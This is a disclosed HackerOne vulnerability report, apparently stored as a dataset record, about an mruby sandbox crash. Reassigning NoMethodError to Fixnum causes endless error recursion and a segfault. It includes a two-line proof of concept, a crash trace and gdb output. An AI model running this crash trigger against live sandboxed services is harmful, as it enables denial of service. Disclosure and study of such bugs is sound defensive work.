{
  "reported_to": "shopify-scripts",
  "reported_by": "brakhane ",
  "title": "Crash: Overwriting NoMethodError with a builtin class crashes/corrupts memory",
  "content": "\nUhm, while testing this I seem to have broken https://mruby.science.. Ooops, sorry about that!\nAnyway, here's the bug:\nOverwriting (at least, not sure about other triggers) NoMethodError with a builtin class like Fixnum or Integer leads to a rather interesting behavior. https://mruby.science didn't crash all the times (reads: it sometimes does report a MRubyEngine::EngineTimeQuotaError), but sometimes it does report the 'Application Error' page after a long time. My local sandbox behaves somewhat like this: it prints the MRubyEngine::EngineTimeQuotaError error but crashes anyway.\nThe root cause is that triggering the NoMethodError triggers another NoMethodError when mrb_no_method_error in error.c tries to call new on the new NoMethodError, which has no new.\nPoC\nCode 28 Bytes\n1NoMethodError = Fixnum\n2boom!\nFix\nI've attached a fix similar to #186719, this time moving the NoMethodError into mrb_state\nTraces\nsandbox:\n$ bin/sandbox new_crashes/fixnum_exception.mrb\nCode 4.58 KiB\n1bin/sandbox:20: [BUG] Segmentation fault at 0x0000000000000a\n2ruby 2.3.3p222 (2016-11-21 revision 56859) [x86_64-linux]\n3\n4-- Control frame information -----------------------------------------------\n5c:0003 p:---- s:0010 e:000009 CFUNC  :sandbox_eval\n6c:0002 p:0201 s:0005 E:000f78 EVAL   bin/sandbox:20 [FINISH]\n7c:0001 p:0000 s:0002 E:000670 (none) [FINISH]\n8\n9-- Ruby level backtrace information ----------------------------------------\n10bin/sandbox:20:in `<main>'\n11bin/sandbox:20:in `sandbox_eval'\n12\n13-- Machine register context ------------------------------------------------\n14 RIP: 0x00007f4ff550b25f RBP: 0x00000000000003bc RSP: 0x00007f4ff4043720\n15 RAX: 0x00007f4ff40c0290 RBX: 0x0000000000000384 RCX: 0x00007f4ff40c2290\n16 RDX: 0x0000000000000400 RDI: 0x00007f4ff40684e0 RSI: 0x000000000000000a\n17  R8: 0x00007f4ff40c2070  R9: 0x00007f4ff40dcab0 R10: 0x0000000000000007\n18 R11: 0x00007f4ff4076510 R12: 0x00007f4ff4074a10 R13: 0x00007f4ff40684e0\n19 R14: 0x0000000000000000 R15: 0x00007f4ff5569dd2 EFL: 0x0000000000010246\n20\n21-- C level backtrace information -------------------------------------------\n22/usr/lib/libruby.so.2.3 [0x7f4ff95cc455]\n23/usr/lib/libruby.so.2.3 [0x7f4ff95cc68c]\n24/usr/lib/libruby.so.2.3 [0x7f4ff94a6e34]\n25/usr/lib/libruby.so.2.3 [0x7f4ff95586ce]\n26/usr/lib/libc.so.6 [0x7f4ff90cc0b0]\n27/home/simon/git/shopify/mruby-engine/lib/mruby_engine/mruby_engine.so(mark_context_stack+0x8f) [0x7f4ff550b25f] /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/include/mruby/boxing_word.h:83\n28/home/simon/git/shopify/mruby-engine/lib/mruby_engine/mruby_engine.so(incremental_gc.part.11+0x5a2) [0x7f4ff550bd92] /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/src/gc.c:938\n29/home/simon/git/shopify/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_incremental_gc+0x1f3) [0x7f4ff550c3a3] /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/src/gc.c:1062\n30/home/simon/git/shopify/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_obj_alloc+0xfd) [0x7f4ff550cb8d] /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/src/gc.c:486\n31/home/simon/git/shopify/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_str_new+0x24) [0x7f4ff54e61c4] /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/src/string.c:59\n32/home/simon/git/shopify/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_vformat+0x123) [0x7f4ff550db83] /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/src/error.c:344\n33/home/simon/git/shopify/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_no_method_error+0x9a) [0x7f4ff550e33a] /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/src/error.c:508\n34/home/simon/git/shopify/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_method_missing+0x95) [0x7f4ff54fd3b5] /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/src/class.c:1468\n35/home/simon/git/shopify/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_bob_missing+0x4d) [0x7f4ff54fd46d] /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/src/class.c:1513\n36/home/simon/git/shopify/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_funcall_with_block+0x27f) [0x7f4ff54f0c1f] \n37[......]\n38/home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/src/vm.c:407\n39/home/simon/git/shopify/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_funcall_argv+0xc) [0x7f4ff54f11dc] /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/src/vm.c:424\n40/home/simon/git/shopify/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_funcall+0x240) [0x7f4ff54f1430] /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/src/vm.c:319\n41/home/simon/git/shopify/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_no_method_error+0x12d) [0x7f4ff550e3cd] /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/src/error.c:508\n42/home/simon/git/shopify/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_method_missing+0x95) [0x7f4ff54fd3b5] /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/src/class.c:1468\n43/home/simon/git/shopify/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_bob_missing+0x4d) [0x7f4ff54fd46d] /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/src/class.c:1513\n44/home/simon/git/shopify/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_funcall_with_block+0x27f) [0x7f4ff54f0c1f] /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/src/vm.c:407\n45/home/simon/git/shopify/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_funcall_argv+0xc) [0x7f4ff54f11dc] /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/src/vm.c:424\n46/home/simon/git/shopify/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_funcall+0x240) bin/sandbox:20:in `sandbox_eval': exceeded quota of 100 ms. (MRubyEngine::EngineTimeQuotaError)\n47\tfrom bin/sandbox:20:in `<main>'\ngdb:\nCode 11.41 KiB\n1$ gdb attach 5534\n2GNU gdb (GDB) 7.12\n3Copyright (C) 2016 Free Software Foundation, Inc.\n4License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>\n5This is free software: you are free to change and redistribute it.\n6There is NO WARRANTY, to the extent permitted by law.  Type \"show copying\"\n7and \"show warranty\" for details.\n8This GDB was configured as \"x86_64-pc-linux-gnu\".\n9Type \"show configuration\" for configuration details.\n10For bug reporting instructions, please see:\n11<http://www.gnu.org/software/gdb/bugs/>.\n12Find the GDB manual and other documentation resources online at:\n13<http://www.gnu.org/software/gdb/documentation/>.\n14For help, type \"help\".\n15Type \"apropos word\" to search for commands related to \"word\"...\n16attach: No such file or directory.\n17Attaching to process 5534\n18Reading symbols from /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/build/host/bin/mirb...done.\n19Reading symbols from /usr/lib/libm.so.6...(no debugging symbols found)...done.\n20Reading symbols from /usr/lib/libreadline.so.7...(no debugging symbols found)...done.\n21Reading symbols from /usr/lib/libncursesw.so.6...(no debugging symbols found)...done.\n22Reading symbols from /usr/lib/libc.so.6...(no debugging symbols found)...done.\n23Reading symbols from /lib64/ld-linux-x86-64.so.2...(no debugging symbols found)...done.\n240x00007fcacf29b131 in pselect () from /usr/lib/libc.so.6\n25(gdb) c\n26Continuing.\n27\n28Program received signal SIGSEGV, Segmentation fault.\n29mark_context_stack (mrb=mrb@entry=0xb1e010, c=c@entry=0xb2a540) at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/src/gc.c:532\n30532\t    if (!mrb_immediate_p(v)) {\n31(gdb) bt\n32#0  mark_context_stack (mrb=mrb@entry=0xb1e010, c=c@entry=0xb2a540) at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/src/gc.c:532\n33#1  0x0000000000428a2c in mark_context (c=0xb2a540, mrb=0xb1e010) at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/src/gc.c:550\n34#2  root_scan_phase (mrb=0xb1e010, gc=0xb1e0e8) at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/src/gc.c:820\n35#3  0x0000000000429793 in incremental_gc (limit=18446744073709551615, gc=0xb1e0e8, mrb=0xb1e010) at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/src/gc.c:1022\n36#4  incremental_gc_until (to_state=<optimized out>, gc=<optimized out>, mrb=<optimized out>) at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/src/gc.c:1053\n37#5  mrb_incremental_gc (mrb=0xb1e010) at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/src/gc.c:1104\n38#6  0x0000000000429f4d in mrb_obj_alloc (mrb=mrb@entry=0xb1e010, ttype=ttype@entry=MRB_TT_STRING, cls=0xb28550) at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/src/gc.c:486\n39#7  0x0000000000406404 in str_new (len=0, p=0x48c0a2 \"\", mrb=mrb@entry=0xb1e010) at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/src/string.c:59\n40#8  mrb_str_new (mrb=mrb@entry=0xb1e010, p=0x48c0a2 \"\", len=0) at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/src/string.c:185\n41#9  0x000000000042af43 in mrb_vformat (mrb=mrb@entry=0xb1e010, format=format@entry=0x48c086 \"undefined method '%S' for %S\", ap=ap@entry=0x7ffe576cfe88) at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/src/error.c:344\n42#10 0x000000000042b8ba in mrb_no_method_error (mrb=mrb@entry=0xb1e010, id=id@entry=11, args=..., args@entry=..., fmt=fmt@entry=0x48c086 \"undefined method '%S' for %S\") at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/src/error.c:508\n43#11 0x000000000041d5f5 in mrb_method_missing (mrb=mrb@entry=0xb1e010, name=11, self=self@entry=..., args=...) at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/src/class.c:1468\n44#12 0x000000000041d6ad in mrb_bob_missing (mrb=0xb1e010, mod=...) at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/src/class.c:1513\n45#13 0x0000000000410e5f in mrb_funcall_with_block (mrb=mrb@entry=0xb1e010, self=..., mid=<optimized out>, argc=<optimized out>, argc@entry=3, argv=argv@entry=0x7ffe576d01c0, blk=..., blk@entry=...) at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/src/vm.c:407\n46#14 0x000000000041141c in mrb_funcall_argv (mrb=mrb@entry=0xb1e010, self=..., self@entry=..., mid=<optimized out>, argc=argc@entry=3, argv=argv@entry=0x7ffe576d01c0) at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/src/vm.c:424\n47#15 0x0000000000411670 in mrb_funcall (mrb=mrb@entry=0xb1e010, self=..., name=name@entry=0x48a81f \"new\", argc=argc@entry=3) at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/src/vm.c:319\n48\n49[......]\n50#1822 0x000000000042b94d in mrb_no_method_error (mrb=mrb@entry=0xb1e010, id=id@entry=11, args=args@entry=..., fmt=fmt@entry=0x48c086 \"undefined method '%S' for %S\") at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/src/error.c:508\n51#1823 0x000000000041d5f5 in mrb_method_missing (mrb=mrb@entry=0xb1e010, name=11, self=self@entry=..., args=...) at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/src/class.c:1468\n52#1824 0x000000000041d6ad in mrb_bob_missing (mrb=0xb1e010, mod=...) at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/src/class.c:1513\n53#1825 0x0000000000410e5f in mrb_funcall_with_block (mrb=mrb@entry=0xb1e010, self=..., mid=<optimized out>, argc=<optimized out>, argc@entry=3, argv=argv@entry=0x7ffe5771df80, blk=..., blk@entry=...) at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/src/vm.c:407\n54#1826 0x000000000041141c in mrb_funcall_argv (mrb=mrb@entry=0xb1e010, self=..., self@entry=..., mid=<optimized out>, argc=argc@entry=3, argv=argv@entry=0x7ffe5771df80) at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/src/vm.c:424\n55#1827 0x0000000000411670 in mrb_funcall (mrb=mrb@entry=0xb1e010, self=..., name=name@entry=0x48a81f \"new\", argc=argc@entry=3) at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/src/vm.c:319\n56#1828 0x000000000042b94d in mrb_no_method_error (mrb=mrb@entry=0xb1e010, id=id@entry=11, args=args@entry=..., fmt=fmt@entry=0x48c086 \"undefined method '%S' for %S\") at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/src/error.c:508\n57#1829 0x000000000041d5f5 in mrb_method_missing (mrb=mrb@entry=0xb1e010, name=11, self=self@entry=..., args=...) at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/src/class.c:1468\n58#1830 0x000000000041d6ad in mrb_bob_missing (mrb=0xb1e010, mod=...) at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/src/class.c:1513\n59#1831 0x0000000000410e5f in mrb_funcall_with_block (mrb=mrb@entry=0xb1e010, self=..., mid=<optimized out>, argc=<optimized out>, argc@entry=3, argv=argv@entry=0x7ffe5771e3a0, blk=..., blk@entry=...) at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/src/vm.c:407\n60#1832 0x000000000041141c in mrb_funcall_argv (mrb=mrb@entry=0xb1e010, self=..., self@entry=..., mid=<optimized out>, argc=argc@entry=3, argv=argv@entry=0x7ffe5771e3a0) at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/src/vm.c:424\n61#1833 0x0000000000411670 in mrb_funcall (mrb=mrb@entry=0xb1e010, self=..., name=name@entry=0x48a81f \"new\", argc=argc@entry=3) at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/src/vm.c:319\n62#1834 0x000000000042b94d in mrb_no_method_error (mrb=mrb@entry=0xb1e010, id=id@entry=11, args=args@entry=..., fmt=fmt@entry=0x48c086 \"undefined method '%S' for %S\") at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/src/error.c:508\n63#1835 0x000000000041d5f5 in mrb_method_missing (mrb=mrb@entry=0xb1e010, name=11, self=self@entry=..., args=...) at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/src/class.c:1468\n64#1836 0x000000000041d6ad in mrb_bob_missing (mrb=0xb1e010, mod=...) at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/src/class.c:1513\n65#1837 0x0000000000410e5f in mrb_funcall_with_block (mrb=mrb@entry=0xb1e010, self=..., mid=<optimized out>, argc=<optimized out>, argc@entry=3, argv=argv@entry=0x7ffe5771e7c0, blk=..., blk@entry=...) at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/src/vm.c:407\n66#1838 0x000000000041141c in mrb_funcall_argv (mrb=mrb@entry=0xb1e010, self=..., self@entry=..., mid=<optimized out>, argc=argc@entry=3, argv=argv@entry=0x7ffe5771e7c0) at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/src/vm.c:424\n67#1839 0x0000000000411670 in mrb_funcall (mrb=mrb@entry=0xb1e010, self=..., name=name@entry=0x48a81f \"new\", argc=argc@entry=3) at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/src/vm.c:319\n68#1840 0x000000000042b94d in mrb_no_method_error (mrb=mrb@entry=0xb1e010, id=id@entry=11, args=args@entry=..., fmt=fmt@entry=0x48c086 \"undefined method '%S' for %S\") at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/src/error.c:508\n69#1841 0x000000000041d5f5 in mrb_method_missing (mrb=mrb@entry=0xb1e010, name=11, self=self@entry=..., args=...) at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/src/class.c:1468\n70#1842 0x000000000041d6ad in mrb_bob_missing (mrb=0xb1e010, mod=...) at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/src/class.c:1513\n71#1843 0x0000000000410e5f in mrb_funcall_with_block (mrb=mrb@entry=0xb1e010, self=..., mid=<optimized out>, argc=<optimized out>, argc@entry=3, argv=argv@entry=0x7ffe5771ebe0, blk=..., blk@entry=...) at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/src/vm.c:407\n72#1844 0x000000000041141c in mrb_funcall_argv (mrb=mrb@entry=0xb1e010, self=..., self@entry=..., mid=<optimized out>, argc=argc@entry=3, argv=argv@entry=0x7ffe5771ebe0) at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/src/vm.c:424\n73#1845 0x0000000000411670 in mrb_funcall (mrb=mrb@entry=0xb1e010, self=..., name=name@entry=0x48a81f \"new\", argc=argc@entry=3) at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/src/vm.c:319\n74#1846 0x000000000042b94d in mrb_no_method_error (mrb=mrb@entry=0xb1e010, id=id@entry=627, args=args@entry=..., fmt=fmt@entry=0x48c086 \"undefined method '%S' for %S\") at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/src/error.c:508\n75#1847 0x000000000041d5f5 in mrb_method_missing (mrb=mrb@entry=0xb1e010, name=627, self=self@entry=..., args=...) at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/src/class.c:1468\n76#1848 0x000000000041d6ad in mrb_bob_missing (mrb=0xb1e010, mod=...) at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/src/class.c:1513\n77#1849 0x0000000000412d62 in mrb_vm_exec (mrb=mrb@entry=0xb1e010, proc=<optimized out>, proc@entry=0xb20e70, pc=<optimized out>) at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/src/vm.c:1165\n78#1850 0x0000000000418a47 in mrb_vm_run (mrb=mrb@entry=0xb1e010, proc=proc@entry=0xb20e70, self=..., stack_keep=stack_keep@entry=1) at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/src/vm.c:766\n79#1851 0x0000000000402b7e in main (argc=<optimized out>, argv=<optimized out>) at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/mrbgems/mruby-bin-mirb/tools/mirb/mirb.c:549\n80(gdb) info registers\n81rax            0xc43420\t12858400\n82rbx            0x384\t900\n83rcx            0xc47820\t12875808\n84rdx            0x880\t2176\n85rsi            0xa\t10\n86rdi            0xb1e010\t11657232\n87rbp            0x862\t0x862\n88rsp            0x7ffe576cfd50\t0x7ffe576cfd50\n89r8             0xc47730\t12875568\n90r9             0x30\t48\n91r10            0x7\t7\n92r11            0xb2c040\t11714624\n93r12            0xb2a540\t11707712\n94r13            0xb1e010\t11657232\n95r14            0x7ffe576cfe88\t140730365181576\n96r15            0x48c0a2\t4767906\n97rip            0x42861f\t0x42861f <mark_context_stack+143>\n98eflags         0x10246\t[ PF ZF IF RF ]\n99cs             0x33\t51\n100ss             0x2b\t43\n101ds             0x0\t0\n102es             0x0\t0\n103fs             0x0\t0\n104gs             0x0\t0\n105(gdb) \n\n",
  "severity": [
    7.0,
    8.9
  ],
  "bounty": 10000,
  "weaknesses": [
    "Memory Corruption - Generic"
  ],
  "screenshots": {},
  "disclosed_date": 1488381300,
  "report_url": "https://hackerone.com/reports/186723",
  "is_multi_component": false,
  "complexity": "MEDIUM",
  "novelty": "LOW",
  "vuln_category": "CODE",
  "steps": [
    [
      1,
      "Assign a builtin class like Fixnum or Integer to NoMethodError: `NoMethodError = Fixnum`"
    ],
    [
      2,
      "Trigger a NoMethodError by calling an undefined method: `boom!`"
    ]
  ],
  "vuln_description": "The vulnerability occurs when NoMethodError is overwritten with a builtin class like Fixnum or Integer. This causes a crash or memory corruption when a NoMethodError is triggered, as the error handling code attempts to call 'new' on the overwritten NoMethodError (which is now a Fixnum/Integer and has no 'new' method), leading to an infinite recursion of NoMethodErrors until a segmentation fault occurs.",
  "reason": "The vulnerability requires understanding of Ruby's exception handling internals and the specific behavior when core exception classes are modified. The interaction between the overwritten NoMethodError and the error handling mechanism is subtle and non-obvious.",
  "new_complexity": "MEDIUM",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null
}